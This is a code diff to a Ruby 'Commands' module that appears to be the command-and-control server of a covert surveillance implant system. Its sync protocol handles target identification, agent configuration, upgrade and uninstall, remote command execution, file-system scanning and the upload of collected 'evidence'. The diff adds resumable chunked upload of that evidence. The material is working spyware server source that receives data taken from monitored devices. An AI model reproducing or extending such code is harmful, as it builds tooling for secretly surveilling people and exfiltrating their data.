@@ -21,21 +21,22 @@ module Commands
 
   # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
 
-  INVALID_COMMAND     = 0x00       # Don't use
-  PROTO_OK            = 0x01       # OK
-  PROTO_NO            = 0x02       # Nothing available
-  PROTO_BYE           = 0x03       # The end of the protocol
-  PROTO_ID            = 0x0f       # Identification of the target
-  PROTO_CONF          = 0x07       # New configuration
-  PROTO_UNINSTALL     = 0x0a       # Uninstall command
-  PROTO_DOWNLOAD      = 0x0c       # List of files to be downloaded
-  PROTO_UPLOAD        = 0x0d       # A file to be saved
-  PROTO_UPGRADE       = 0x16       # Upgrade for the agent
-  PROTO_EVIDENCE      = 0x09       # Upload of an evidence
-  PROTO_EVIDENCE_SIZE = 0x0b       # Queue for evidence
-  PROTO_FILESYSTEM    = 0x19       # List of paths to be scanned
-  PROTO_PURGE         = 0x1a       # purge the log queue
-  PROTO_EXEC          = 0x1b       # execution of commands during sync
+  INVALID_COMMAND      = 0x00       # Don't use
+  PROTO_OK             = 0x01       # OK
+  PROTO_NO             = 0x02       # Nothing available
+  PROTO_BYE            = 0x03       # The end of the protocol
+  PROTO_ID             = 0x0f       # Identification of the target
+  PROTO_CONF           = 0x07       # New configuration
+  PROTO_UNINSTALL      = 0x0a       # Uninstall command
+  PROTO_DOWNLOAD       = 0x0c       # List of files to be downloaded
+  PROTO_UPLOAD         = 0x0d       # A file to be saved
+  PROTO_UPGRADE        = 0x16       # Upgrade for the agent
+  PROTO_EVIDENCE       = 0x09       # Upload of an evidence
+  PROTO_EVIDENCE_CHUNK = 0x10       # Upload of an evidence (in chunks)
+  PROTO_EVIDENCE_SIZE  = 0x0b       # Queue for evidence
+  PROTO_FILESYSTEM     = 0x19       # List of paths to be scanned
+  PROTO_PURGE          = 0x1a       # purge the log queue
+  PROTO_EXEC           = 0x1b       # execution of commands during sync
 
   LOOKUP = { PROTO_ID => :command_id,
              PROTO_CONF => :command_conf,
@@ -46,6 +47,7 @@ module Commands
              PROTO_PURGE => :command_purge,
              PROTO_EXEC => :command_exec,
              PROTO_EVIDENCE => :command_evidence,
+             PROTO_EVIDENCE_CHUNK => :command_evidence_chunk,
              PROTO_EVIDENCE_SIZE => :command_evidence_size,
              PROTO_BYE => :command_bye}
 
@@ -146,7 +148,7 @@ module Commands
   # -> PROTO_CONF
   # <- PROTO_NO | PROTO_OK [ Conf ]
   # -> PROTO_CONF [ status ]
-  # <- PROTO_NO | PROTO_OK [ Conf ]
+  # <- PROTO_OK
   def command_conf(peer, session, message)
     trace :info, "[#{peer}][#{session[:cookie]}] Configuration request"
 
@@ -160,7 +162,7 @@ module Commands
       else
         trace :warn, "[#{peer}][#{session[:cookie]}] Agent not able to use the configuration"
       end
-      return [PROTO_OK].pack('I')
+      return [PROTO_OK].pack('I') + [0].pack('I')
     end
 
     # the conf was already retrieved (if any) during the ident phase
@@ -329,6 +331,44 @@ module Commands
 
     return [PROTO_OK].pack('I') + [0].pack('I')
   end
+
+  # Protocol Evidence (with resume in chunk)
+  # -> PROTO_EVIDENCE_CHUNK [ id, base, chunk, size, content ]
+  # <- PROTO_OK [ base ] | PROTO_NO
+  def command_evidence_chunk(peer, session, message)
+
+    id, base, chunk, size = message.slice!(0..15).unpack('I*')
+
+    trace :info, "[#{peer}][#{session[:cookie]}] Evidence sent in chunk #{base}+#{chunk} (#{size} bytes)"
+
+    begin
+
+      # store the partial evidence in the db
+      complete, evidence = EvidenceManager.instance.store_evidence_chunk session, id, base, chunk, size, message
+
+      if complete == size
+        # store the evidence in the db
+        EvidenceManager.instance.store_evidence session, size, evidence
+
+        # remember the statistics for input evidence
+        StatsManager.instance.add ev_input: 1, ev_input_size: size
+
+        # remember how many evidence were transferred in this session
+        session[:count] += 1
+
+        total = session[:total] > 0 ? session[:total] : 'unknown'
+        trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes) - #{session[:count]} of #{total}"
+      end
+
+    rescue Exception => e
+      trace :fatal, e.backtrace.join("\n")
+      trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
+      return [PROTO_NO].pack('I')
+    end
+
+    return [PROTO_OK].pack('I') + [4].pack('I') + [complete].pack('I')
+  end
+
 
   # Protocol Evidence Size
   # -> PROTO_EVIDENCE_SIZE [ num, size]
